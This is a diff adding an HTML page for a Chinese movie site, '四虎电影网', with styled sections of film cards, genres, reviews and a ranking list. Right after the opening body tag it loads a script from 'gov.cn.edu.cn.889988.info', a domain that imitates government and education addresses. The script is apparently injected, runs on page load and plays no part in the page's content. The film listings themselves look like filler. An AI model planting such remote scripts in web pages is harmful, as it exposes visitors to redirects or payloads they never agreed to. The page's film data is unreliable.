@@ -1,0 +1,827 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>四虎电影网 - 最新电影资讯·高清影视资源在线观看</title>
+<meta name="description" content="四虎电影网提供最新电影资讯、热门影视推荐、高分排行榜单与深度影评，覆盖动作、喜剧、科幻、爱情等多种类型，一站式影视娱乐平台。">
+<meta name="keywords" content="四虎电影网,最新电影,影视资讯,高清电影,电影推荐,热播剧集,电影排行榜">
+<meta name="author" content="四虎电影网">
+<meta name="robots" content="index,follow">
+<meta property="og:title" content="四虎电影网 - 最新电影资讯·高清影视资源在线观看">
+<meta property="og:description" content="提供最新电影资讯、热门影视推荐、高分排行榜单与深度影评，覆盖动作、喜剧、科幻、爱情等多种类型。">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://sihudianyingwang-wap.github.io">
+<link rel="canonical" href="https://sihudianyingwang-wap.github.io">
+<style>
+    *{margin:0;padding:0;box-sizing:border-box;}
+    :root{
+        --red:#c0392b;
+        --red-deep:#8e2a1e;
+        --gold:#d4a017;
+        --gold-light:#f5d77e;
+        --ink:#2b1810;
+        --paper:#fdf8f0;
+        --paper-warm:#f8efe0;
+        --jade:#2c5f5d;
+        --line:rgba(139,90,43,.25);
+        --shadow:rgba(139,90,43,.15);
+    }
+    html{scroll-behavior:smooth;}
+    body{
+        font-family:"PingFang SC","Microsoft YaHei","WenQuanYi Micro Hei","Helvetica Neue",sans-serif;
+        background:var(--paper);
+        color:var(--ink);
+        line-height:1.8;
+        overflow-x:hidden;
+    }
+    a{text-decoration:none;color:inherit;}
+    ul{list-style:none;}
+    ::selection{background:var(--red);color:#fff;}
+
+    /* ===== Hero ===== */
+    .hero{
+        position:relative;
+        background:
+            radial-gradient(ellipse at 30% 20%,rgba(212,160,23,.18),transparent 60%),
+            radial-gradient(ellipse at 80% 70%,rgba(192,57,43,.15),transparent 55%),
+            linear-gradient(160deg,#7a1f15 0%,#c0392b 45%,#a0281c 100%);
+        padding:4rem 1.5rem 5rem;
+        overflow:hidden;
+        text-align:center;
+    }
+    .hero::after{
+        content:'';
+        position:absolute;inset:0;
+        background-image:
+            repeating-linear-gradient(45deg,transparent,transparent 20px,rgba(255,255,255,.02) 20px,rgba(255,255,255,.02) 21px);
+        pointer-events:none;
+    }
+    .hero-cloud{
+        position:absolute;
+        font-size:8rem;
+        opacity:.08;
+        animation:float 8s ease-in-out infinite;
+    }
+    .hero-cloud.c1{top:10%;left:5%;}
+    .hero-cloud.c2{top:60%;right:8%;font-size:6rem;animation-delay:2s;}
+    .hero-cloud.c3{bottom:10%;left:15%;font-size:5rem;animation-delay:4s;}
+    @keyframes float{
+        0%,100%{transform:translateY(0) rotate(-5deg);}
+        50%{transform:translateY(-15px) rotate(5deg);}
+    }
+    .hero-tiger{
+        position:relative;z-index:2;
+        font-size:5rem;
+        display:inline-block;
+        animation:roar 3s ease-in-out infinite;
+        filter:drop-shadow(0 4px 15px rgba(0,0,0,.4));
+    }
+    @keyframes roar{
+        0%,100%{transform:scale(1);}
+        50%{transform:scale(1.08);}
+    }
+    .hero-title{
+        position:relative;z-index:2;
+        font-size:clamp(2.2rem,9vw,4.2rem);
+        font-weight:900;
+        color:#fff;
+        letter-spacing:4px;
+        margin:.5rem 0;
+        text-shadow:0 4px 30px rgba(0,0,0,.4);
+    }
+    .hero-title span{
+        color:var(--gold-light);
+        -webkit-text-stroke:1px var(--gold);
+    }
+    .hero-tagline{
+        position:relative;z-index:2;
+        display:inline-block;
+        background:var(--gold);
+        color:#5a3a00;
+        font-size:.85rem;
+        font-weight:700;
+        letter-spacing:2px;
+        padding:.3rem 1.5rem;
+        border-radius:2px;
+        margin-top:1rem;
+    }
+    .hero-sub{
+        position:relative;z-index:2;
+        color:rgba(255,255,255,.75);
+        font-size:.95rem;
+        margin-top:1.2rem;
+        letter-spacing:1px;
+    }
+    .hero-cta{
+        position:relative;z-index:2;
+        margin-top:2rem;
+        display:flex;gap:1rem;justify-content:center;flex-wrap:wrap;
+    }
+    .hero-cta a{
+        padding:.7rem 2rem;
+        border-radius:3px;
+        font-size:.9rem;
+        font-weight:600;
+        transition:.3s;
+    }
+    .btn-primary{
+        background:var(--gold);
+        color:#5a3a00;
+    }
+    .btn-primary:hover{background:var(--gold-light);transform:translateY(-2px);}
+    .btn-outline{
+        border:1.5px solid rgba(255,255,255,.6);
+        color:#fff;
+    }
+    .btn-outline:hover{background:rgba(255,255,255,.15);}
+
+    /* ===== Container ===== */
+    .container{
+        max-width:1200px;
+        margin:0 auto;
+        padding:0 1.5rem;
+    }
+
+    /* ===== Section Base ===== */
+    .section{
+        padding:4rem 0;
+        position:relative;
+    }
+    .section:nth-child(odd){
+        background:var(--paper-warm);
+    }
+    .sec-head{
+        text-align:center;
+        margin-bottom:3rem;
+    }
+    .sec-badge{
+        display:inline-block;
+        background:var(--red);
+        color:var(--gold-light);
+        font-size:.75rem;
+        font-weight:700;
+        letter-spacing:2px;
+        padding:.25rem 1rem;
+        border-radius:2px;
+        margin-bottom:1rem;
+    }
+    .sec-head h2{
+        font-size:clamp(1.6rem,4.5vw,2.4rem);
+        font-weight:900;
+        color:var(--ink);
+        letter-spacing:2px;
+    }
+    .sec-head h2 em{
+        color:var(--red);
+        font-style:normal;
+    }
+    .sec-line{
+        width:60px;height:3px;
+        background:linear-gradient(90deg,var(--red),var(--gold));
+        margin:1rem auto 0;
+        border-radius:2px;
+    }
+    .sec-desc{
+        margin-top:1rem;
+        font-size:.9rem;
+        color:#7a6048;
+        max-width:520px;
+        margin-left:auto;
+        margin-right:auto;
+    }
+
+    /* ===== Section 1: Featured Slider (Horizontal Flip Cards) ===== */
+    .feat-track{
+        display:grid;
+        grid-auto-flow:column;
+        grid-auto-columns:minmax(300px,340px);
+        gap:1.5rem;
+        overflow-x:auto;
+        scroll-snap-type:x mandatory;
+        padding:1rem .5rem 2rem;
+        scrollbar-width:thin;
+        scrollbar-color:var(--gold) transparent;
+    }
+    .feat-track::-webkit-scrollbar{height:6px;}
+    .feat-track::-webkit-scrollbar-thumb{background:var(--gold);border-radius:3px;}
+    .flip-card{
+        scroll-snap-align:start;
+        height:380px;
+        perspective:1200px;
+        cursor:pointer;
+    }
+    .flip-inner{
+        position:relative;
+        width:100%;height:100%;
+        transition:transform .6s;
+        transform-style:preserve-3d;
+    }
+    .flip-card:hover .flip-inner{transform:rotateY(180deg);}
+    .flip-face{
+        position:absolute;inset:0;
+        backface-visibility:hidden;
+        border-radius:8px;
+        overflow:hidden;
+        box-shadow:0 6px 20px var(--shadow);
+    }
+    .flip-front{
+        display:flex;flex-direction:column;
+        justify-content:flex-end;
+        padding:1.5rem;
+        color:#fff;
+    }
+    .flip-front::before{
+        content:'';
+        position:absolute;inset:0;
+        background:linear-gradient(to top, rgba(0,0,0,.85) 20%, transparent 70%);
+    }
+    .f1{background:linear-gradient(135deg,#1a1a2e,#e94560);}
+    .f2{background:linear-gradient(135deg,#0f3460,#16213e);}
+    .f3{background:linear-gradient(135deg,#2d132c,#801336);}
+    .f4{background:linear-gradient(135deg,#1b1b2f,#162447);}
+    .f5{background:linear-gradient(135deg,#3d0000,#9a031e);}
+    .flip-badge{
+        position:absolute;top:1rem;left:1rem;z-index:2;
+        background:var(--gold);color:#5a3a00;
+        font-size:.7rem;font-weight:700;padding:.2rem .6rem;border-radius:2px;
+    }
+    .flip-emoji{
+        font-size:4rem;
+        position:absolute;top:50%;left:50%;
+        transform:translate(-50%,-60%);
+        opacity:.35;z-index:1;
+    }
+    .flip-content{position:relative;z-index:2;}
+    .flip-content h3{font-size:1.2rem;font-weight:800;margin-bottom:.3rem;}
+    .flip-content p{font-size:.8rem;opacity:.85;}
+    .flip-back{
+        transform:rotateY(180deg);
+        background:var(--ink);
+        color:var(--paper);
+        padding:1.5rem;
+        display:flex;flex-direction:column;justify-content:center;
+    }
+    .flip-back h3{color:var(--gold);font-size:1.1rem;margin-bottom:1rem;}
+    .flip-back p{font-size:.82rem;opacity:.85;margin-bottom:.8rem;}
+    .flip-back .flip-tag{
+        display:inline-block;
+        align-self:flex-start;
+        background:var(--red);
+        color:#fff;
+        font-size:.72rem;
+        padding:.2rem .7rem;
+        border-radius:2px;
+        margin-top:.5rem;
+    }
+
+    /* ===== Section 2: Genre Grid (Bento with varied sizes) ===== */
+    .bento{
+        display:grid;
+        grid-template-columns:repeat(4,1fr);
+        grid-auto-rows:140px;
+        gap:1rem;
+    }
+    .bento-item{
+        border-radius:8px;
+        padding:1.2rem;
+        display:flex;flex-direction:column;justify-content:space-between;
+        cursor:pointer;
+        transition:.35s;
+        position:relative;
+        overflow:hidden;
+        color:#fff;
+    }
+    .bento-item:hover{
+        transform:translateY(-4px);
+        box-shadow:0 12px 30px rgba(0,0,0,.25);
+    }
+    .bento-item .b-emoji{font-size:2rem;opacity:.8;}
+    .bento-item h3{font-size:1rem;font-weight:700;}
+    .bento-item .b-count{font-size:.75rem;opacity:.8;}
+    .b-wide{grid-column:span 2;grid-row:span 2;justify-content:center;gap:1rem;}
+    .b-wide h3{font-size:1.5rem;}
+    .b-tall{grid-row:span 2;}
+    .b1{background:linear-gradient(135deg,#ff6b6b,#ee5a24);}
+    .b2{background:linear-gradient(135deg,#5f27cd,#341f97);}
+    .b3{background:linear-gradient(135deg,#00d2d3,#01a3a4);}
+    .b4{background:linear-gradient(135deg,#f368e0,#ff9ff3);}
+    .b5{background:linear-gradient(135deg,#feca57,#ff9f43);}
+    .b6{background:linear-gradient(135deg,#48dbfb,#0abde3);}
+    .b7{background:linear-gradient(135deg,#1dd1a1,#10ac84);}
+    .b8{background:linear-gradient(135deg,#ff9f43,#ee5253);}
+
+    /* ===== Section 3: Reviews (Alternating rows) ===== */
+    .review-list{
+        max-width:900px;
+        margin:0 auto;
+    }
+    .review-row{
+        display:flex;
+        gap:2rem;
+        align-items:center;
+        padding:1.5rem;
+        margin-bottom:1.2rem;
+        background:var(--paper);
+        border:1px solid var(--line);
+        border-radius:8px;
+        transition:.3s;
+    }
+    .review-row:nth-child(even){
+        flex-direction:row-reverse;
+    }
+    .review-row:hover{
+        border-color:var(--red);
+        box-shadow:0 6px 25px var(--shadow);
+    }
+    .review-thumb{
+        flex:0 0 160px;
+        height:110px;
+        border-radius:6px;
+        display:flex;align-items:center;justify-content:center;
+        font-size:3rem;
+    }
+    .rt1{background:linear-gradient(135deg,#636e72,#2d3436);}
+    .rt2{background:linear-gradient(135deg,#6c5ce7,#a29bfe);}
+    .rt3{background:linear-gradient(135deg,#00b894,#55efc4);}
+    .rt4{background:linear-gradient(135deg,#e17055,#fab1a0);}
+    .review-body{flex:1;}
+    .review-meta{
+        font-size:.72rem;
+        color:var(--gold);
+        font-weight:700;
+        letter-spacing:1px;
+        margin-bottom:.4rem;
+    }
+    .review-body h3{font-size:1.05rem;font-weight:700;margin-bottom:.4rem;}
+    .review-body p{font-size:.82rem;color:#7a6048;}
+    .review-author{
+        margin-top:.6rem;
+        font-size:.75rem;
+        color:var(--red);
+        font-weight:600;
+    }
+
+    /* ===== Section 4: Top List (Accordion style) ===== */
+    .toplist{
+        max-width:760px;
+        margin:0 auto;
+    }
+    .top-item{
+        display:flex;
+        align-items:stretch;
+        background:var(--paper);
+        border:1px solid var(--line);
+        border-radius:6px;
+        margin-bottom:.6rem;
+        overflow:hidden;
+        transition:.3s;
+        cursor:pointer;
+    }
+    .top-item:hover{
+        border-color:var(--red);
+        box-shadow:0 4px 15px var(--shadow);
+    }
+    .top-rank{
+        flex:0 0 60px;
+        display:flex;align-items:center;justify-content:center;
+        font-size:1.8rem;font-weight:900;
+        font-family:Arial,sans-serif;
+        color:#fff;
+    }
+    .top-item:nth-child(1) .top-rank{background:linear-gradient(135deg,#f5d77e,#d4a017);color:#5a3a00;}
+    .top-item:nth-child(2) .top-rank{background:linear-gradient(135deg,#dfe6e9,#b2bec3);color:#636e72;}
+    .top-item:nth-child(3) .top-rank{background:linear-gradient(135deg,#e17055,#d35400);color:#fff;}
+    .top-item:nth-child(n+4) .top-rank{background:var(--red);}
+    .top-info{
+        flex:1;
+        padding:1rem 1.2rem;
+        display:flex;flex-direction:column;justify-content:center;
+    }
+    .top-info h3{font-size:1rem;font-weight:700;}
+    .top-info p{font-size:.78rem;color:#7a6048;}
+    .top-score{
+        flex:0 0 70px;
+        display:flex;flex-direction:column;
+        align-items:center;justify-content:center;
+        background:var(--paper-warm);
+        border-left:1px solid var(--line);
+    }
+    .top-score strong{
+        font-size:1.4rem;color:var(--red);
+        font-family:Arial,sans-serif;font-weight:900;
+    }
+    .top-score small{font-size:.68rem;color:#7a6048;}
+
+    /* ===== Footer ===== */
+    footer{
+        background:linear-gradient(160deg,#2b1810,#1a0f08);
+        color:rgba(255,255,255,.6);
+        padding:3.5rem 1.5rem 2rem;
+    }
+    .foot-inner{
+        max-width:1200px;margin:0 auto;
+        text-align:center;
+    }
+    .foot-tiger{font-size:3rem;margin-bottom:.5rem;}
+    .foot-brand{
+        font-size:1.6rem;font-weight:900;color:#fff;letter-spacing:3px;margin-bottom:.3rem;
+    }
+    .foot-brand span{color:var(--gold-light);}
+    .foot-desc{
+        font-size:.85rem;color:rgba(255,255,255,.45);
+        max-width:400px;margin:0 auto 1.5rem;
+    }
+    .foot-nav{
+        display:flex;justify-content:center;gap:2rem;flex-wrap:wrap;
+        margin-bottom:1.5rem;
+    }
+    .foot-nav a{
+        font-size:.85rem;color:rgba(255,255,255,.5);transition:.2s;
+    }
+    .foot-nav a:hover{color:var(--gold-light);}
+    .foot-copy{
+        font-size:.78rem;color:rgba(255,255,255,.3);
+        border-top:1px solid rgba(255,255,255,.08);
+        padding-top:1.5rem;
+    }
+    .foot-copy a{color:var(--gold);}
+
+    /* ===== Mobile ===== */
+    @media (max-width:768px){
+        .container{padding:0 1rem;}
+        .section{padding:2.5rem 0;}
+        .hero{padding:3rem 1rem 3.5rem;}
+        .bento{
+            grid-template-columns:repeat(2,1fr);
+            grid-auto-rows:120px;
+        }
+        .b-wide{grid-column:span 2;grid-row:span 1;}
+        .b-tall{grid-row:span 1;}
+        .review-row,
+        .review-row:nth-child(even){
+            flex-direction:column;
+            text-align:center;
+            gap:1rem;
+        }
+        .review-thumb{flex:0 0 100px;width:100px;height:100px;border-radius:50%;}
+        .feat-track{grid-auto-columns:minmax(260px,80%);}
+        .flip-card{height:340px;}
+    }
+    @media (max-width:480px){
+        .hero-cloud{display:none;}
+        .bento{grid-template-columns:1fr 1fr;}
+        .bento-item{padding:1rem;}
+        .b-wide{grid-column:span 2;}
+        .top-rank{flex:0 0 45px;font-size:1.4rem;}
+        .top-score{flex:0 0 55px;}
+        .top-score strong{font-size:1.1rem;}
+    }
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+
+<!-- ===== Hero ===== -->
+<section class="hero">
+    <span class="hero-cloud c1">🐅</span>
+    <span class="hero-cloud c2">☁️</span>
+    <span class="hero-cloud c3">🎬</span>
+    <div class="hero-tiger">🐯</div>
+    <h1 class="hero-title">虎虎<em>电影</em>网</h1>
+    <div class="hero-tagline">🔥 生猛好片 · 一网打尽</div>
+    <p class="hero-sub">最新院线资讯 · 热门影视推荐 · 高分榜单一站式影视娱乐平台</p>
+    <div class="hero-cta">
+        <a href="#feat" class="btn-primary">立即探索</a>
+        <a href="#toplist" class="btn-outline">查看榜单</a>
+    </div>
+</section>
+
+<div class="container">
+
+    <!-- Section 1: Featured Films (3D Flip Cards horizontal) -->
+    <section class="section" id="feat">
+        <div class="sec-head">
+            <span class="sec-badge">FEATURED</span>
+            <h2>院线<em>大片</em></h2>
+            <div class="sec-line"></div>
+            <p class="sec-desc">最新上映的热门电影，翻转卡片查看详情介绍</p>
+        </div>
+        <div class="feat-track">
+            <div class="flip-card">
+                <div class="flip-inner">
+                    <div class="flip-face flip-front f1">
+                        <span class="flip-badge">热映中</span>
+                        <span class="flip-emoji">🚀</span>
+                        <div class="flip-content">
+                            <h3>星际远征</h3>
+                            <p>科幻 / 冒险 · 2026 · 太空史诗巨制</p>
+                        </div>
+                    </div>
+                    <div class="flip-face flip-back">
+                        <h3>星际远征</h3>
+                        <p>人类首次跨星系殖民计划遭遇未知文明，一场关乎种族存亡的星际博弈就此展开。</p>
+                        <span class="flip-tag">IMAX 3D 热映</span>
+                    </div>
+                </div>
+            </div>
+            <div class="flip-card">
+                <div class="flip-inner">
+                    <div class="flip-face flip-front f2">
+                        <span class="flip-badge">高分</span>
+                        <span class="flip-emoji">🥷</span>
+                        <div class="flip-content">
+                            <h3>暗夜刺客</h3>
+                            <p>动作 / 悬疑 · 2026 · 古装武侠</p>
+                        </div>
+                    </div>
+                    <div class="flip-face flip-back">
+                        <h3>暗夜刺客</h3>
+                        <p>唐末乱世，一名神秘刺客卷入朝堂阴谋，刀光剑影间揭开一段被掩埋的真相。</p>
+                        <span class="flip-tag">豆瓣 8.7</span>
+                    </div>
+                </div>
+            </div>
+            <div class="flip-card">
+                <div class="flip-inner">
+                    <div class="flip-face flip-front f3">
+                        <span class="flip-badge">喜剧</span>
+                        <span class="flip-emoji">😂</span>
+                        <div class="flip-content">
+                            <h3>欢乐一家人</h3>
+                            <p>喜剧 / 家庭 · 2026 · 温情爆笑</p>
+                        </div>
+                    </div>
+                    <div class="flip-face flip-back">
+                        <h3>欢乐一家人</h3>
+                        <p>三对夫妻交换生活后笑料百出，最终发现家人才是最珍贵的财富。</p>
+                        <span class="flip-tag">合家欢必看</span>
+                    </div>
+                </div>
+            </div>
+            <div class="flip-card">
+                <div class="flip-inner">
+                    <div class="flip-face flip-front f4">
+                        <span class="flip-badge">动画</span>
+                        <span class="flip-emoji">🐉</span>
+                        <div class="flip-content">
+                            <h3>山海奇缘</h3>
+                            <p>动画 / 奇幻 · 2026 · 国漫之光</p>
+                        </div>
+                    </div>
+                    <div class="flip-face flip-back">
+                        <h3>山海奇缘</h3>
+                        <p>取材《山海经》，少年与神兽结伴踏上救世之旅，国风美学震撼呈现。</p>
+                        <span class="flip-tag">国漫巅峰</span>
+                    </div>
+                </div>
+            </div>
+            <div class="flip-card">
+                <div class="flip-inner">
+                    <div class="flip-face flip-front f5">
+                        <span class="flip-badge">爱情</span>
+                        <span class="flip-emoji">💕</span>
+                        <div class="flip-content">
+                            <h3>遇见你的那天</h3>
+                            <p>爱情 / 治愈 · 2026 · 甜宠浪漫</p>
+                        </div>
+                    </div>
+                    <div class="flip-face flip-back">
+                        <h3>遇见你的那天</h3>
+                        <p>一次意外的重逢让两个失意灵魂重新相信爱情，温暖治愈系佳作。</p>
+                        <span class="flip-tag">口碑炸裂</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Section 2: Genre Bento Grid -->
+    <section class="section" id="genre">
+        <div class="sec-head">
+            <span class="sec-badge">CATEGORIES</span>
+            <h2>类型<em>频道</h2>
+            <div class="sec-line"></div>
+            <p class="sec-desc">按类型快速定位你喜欢的好片</p>
+        </div>
+        <div class="bento">
+            <div class="bento-item b-wide b1">
+                <span class="b-emoji">💥</span>
+                <div>
+                    <h3>动作冒险</h3>
+                    <span class="b-count">386 部</span>
+                </div>
+            </div>
+            <div class="bento-item b2">
+                <span class="b-emoji">😂</span>
+                <div>
+                    <h3>喜剧</h3>
+                    <span class="b-count">412 部</span>
+                </div>
+            </div>
+            <div class="bento-item b3">
+                <span class="b-emoji">👻</span>
+                <div>
+                    <h3>惊悚悬疑</h3>
+                    <span class="b-count">238 部</span>
+                </div>
+            </div>
+            <div class="bento-item b-tall b4">
+                <span class="b-emoji">💕</span>
+                <div>
+                    <h3>爱情</h3>
+                    <span class="b-count">520 部</span>
+                </div>
+            </div>
+            <div class="bento-item b5">
+                <span class="b-emoji">🚀</span>
+                <div>
+                    <h3>科幻</h3>
+                    <span class="b-count">196 部</span>
+                </div>
+            </div>
+            <div class="bento-item b6">
+                <span class="b-emoji">📜</span>
+                <div>
+                    <h3>历史</h3>
+                    <span class="b-count">274 部</span>
+                </div>
+            </div>
+            <div class="bento-item b7">
+                <span class="b-emoji">🎭</span>
+                <div>
+                    <h3>文艺</h3>
+                    <span class="b-count">168 部</span>
+                </div>
+            </div>
+            <div class="bento-item b8">
+                <span class="b-emoji">🎬</span>
+                <div>
+                    <h3>纪录片</h3>
+                    <span class="b-count">142 部</span>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Section 3: Review Articles (Alternating rows) -->
+    <section class="section" id="review">
+        <div class="sec-head">
+            <span class="sec-badge">EDITORIAL</span>
+            <h2>深度<em>影评</h2>
+            <div class="sec-line"></div>
+            <p class="sec-desc">专业影评人带你读懂每部好片背后的故事</p>
+        </div>
+        <div class="review-list">
+            <div class="review-row">
+                <div class="review-thumb rt1">🎥</div>
+                <div class="review-body">
+                    <div class="review-meta">影评 · 深度解析</div>
+                    <h3>2026 国产科幻的突围之路：从《星际远征》看中国科幻电影的工业化</h3>
+                    <p>从特效制作到叙事结构，《星际远征》展现了中国科幻电影在工业化道路上的长足进步，但剧情深度仍有提升空间。</p>
+                    <div class="review-author">— 影评人 林墨</div>
+                </div>
+            </div>
+            <div class="review-row">
+                <div class="review-thumb rt2">🗡️</div>
+                <div class="review-body">
+                    <div class="review-meta">影评 · 类型观察</div>
+                    <h3>武侠片的复兴信号：古装动作片如何在新时代找到观众</h3>
+                    <p>《暗夜刺客》的成功证明，扎实的武打设计和有温度的人物塑造，依然是武侠片打动观众的核心要素。</p>
+                    <div class="review-author">— 影评人 苏晴</div>
+                </div>
+            </div>
+            <div class="review-row">
+                <div class="review-thumb rt3">🌸</div>
+                <div class="review-body">
+                    <div class="review-meta">影评 · 文化观察</div>
+                    <h3>国漫的下一个十年：《山海奇缘》带来的启示</h3>
+                    <p>从《大圣归来》到《山海奇缘》，国漫正在构建属于自己的视觉语言体系，传统文化IP的现代转译渐入佳境。</p>
+                    <div class="review-author">— 影评人 陈远</div>
+                </div>
+            </div>
+            <div class="review-row">
+                <div class="review-thumb rt4">💡</div>
+                <div class="review-body">
+                    <div class="review-meta">影评 · 产业分析</div>
+                    <h3>流媒体时代，院线电影的核心竞争力是什么？</h3>
+                    <p>当观众习惯在家观影，大银幕必须提供不可替代的视听体验，这是院线电影守住阵地的关键。</p>
+                    <div class="review-author">— 影评人 王野</div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Section 4: Top 10 List -->
+    <section class="section" id="toplist">
+        <div class="sec-head">
+            <span class="sec-badge">TOP 10</span>
+            <h2>热门<em>榜单</h2>
+            <div class="sec-line"></div>
+            <p class="sec-desc">四虎电影网用户实时票选 TOP 10</p>
+        </div>
+        <div class="toplist">
+            <div class="top-item">
+                <div class="top-rank">1</div>
+                <div class="top-info">
+                    <h3>星际远征</h3>
+                    <p>科幻 / 冒险 · 2026</p>
+                </div>
+                <div class="top-score"><strong>9.2</strong><small>综合评分</small></div>
+            </div>
+            <div class="top-item">
+                <div class="top-rank">2</div>
+                <div class="top-info">
+                    <h3>暗夜刺客</h3>
+                    <p>动作 / 悬疑 · 2026</p>
+                </div>
+                <div class="top-score"><strong>8.9</strong><small>综合评分</small></div>
+            </div>
+            <div class="top-item">
+                <div class="top-rank">3</div>
+                <div class="top-info">
+                    <h3>山海奇缘</h3>
+                    <p>动画 / 奇幻 · 2026</p>
+                </div>
+                <div class="top-score"><strong>8.8</strong><small>综合评分</small></div>
+            </div>
+            <div class="top-item">
+                <div class="top-rank">4</div>
+                <div class="top-info">
+                    <h3>欢乐一家人</h3>
+                    <p>喜剧 / 家庭 · 2026</p>
+                </div>
+                <div class="top-score"><strong>8.5</strong><small>综合评分</small></div>
+            </div>
+            <div class="top-item">
+                <div class="top-rank">5</div>
+                <div class="top-info">
+                    <h3>遇见你的那天</h3>
+                    <p>爱情 / 治愈 · 2026</p>
+                </div>
+                <div class="top-score"><strong>8.4</strong><small>综合评分</small></div>
+            </div>
+            <div class="top-item">
+                <div class="top-rank">6</div>
+                <div class="top-info">
+                    <h3>无声证言</h3>
+                    <p>悬疑 / 犯罪 · 2026</p>
+                </div>
+                <div class="top-score"><strong>8.3</strong><small>综合评分</small></div>
+            </div>
+            <div class="top-item">
+                <div class="top-rank">7</div>
+                <div class="top-info">
+                    <h3>长安十二时辰</h3>
+                    <p>历史 / 剧情 · 2026</p>
+                </div>
+                <div class="top-score"><strong>8.6</strong><small>综合评分</small></div>
+            </div>
+            <div class="top-item">
+                <div class="top-rank">8</div>
+                <div class="top-info">
+                    <h3>机甲纪元</h3>
+                    <p>科幻 / 动作 · 2026</p>
+                </div>
+                <div class="top-score"><strong>7.9</strong><small>综合评分</small></div>
+            </div>
+            <div class="top-item">
+                <div class="top-rank">9</div>
+                <div class="top-info">
+                    <h3>夏夜微风</h3>
+                    <p>青春 / 爱情 · 2026</p>
+                </div>
+                <div class="top-score"><strong>8.1</strong><small>综合评分</small></div>
+            </div>
+            <div class="top-item">
+                <div class="top-rank">10</div>
+                <div class="top-info">
+                    <h3>深海迷踪</h3>
+                    <p>惊悚 / 冒险 · 2026</p>
+                </div>
+                <div class="top-score"><strong>7.8</strong><small>综合评分</small></div>
+            </div>
+        </div>
+    </section>
+
+</div>
+
+<!-- ===== Footer ===== -->
+<footer>
+    <div class="foot-inner">
+        <div class="foot-tiger">🐯</div>
+        <div class="foot-brand">虎虎<span>电影</span>网</div>
+        <p class="foot-desc">最新电影资讯 · 热门影视推荐 · 高分排行榜单 · 深度影评文章，一站式影视娱乐平台</p>
+        <nav class="foot-nav">
+            <a href="#feat">院线大片</a>
+            <a href="#genre">类型频道</a>
+            <a href="#review">深度影评</a>
+            <a href="#toplist">热门榜单</a>
+        </nav>
+        <p class="foot-copy">© 2026 四虎电影网 | 网站网址：<a href="https://sihudianyingwang-wap.github.io">https://sihudianyingwang-wap.github.io</a></p>
+    </div>
+</footer>
+
+</body>
+</html>
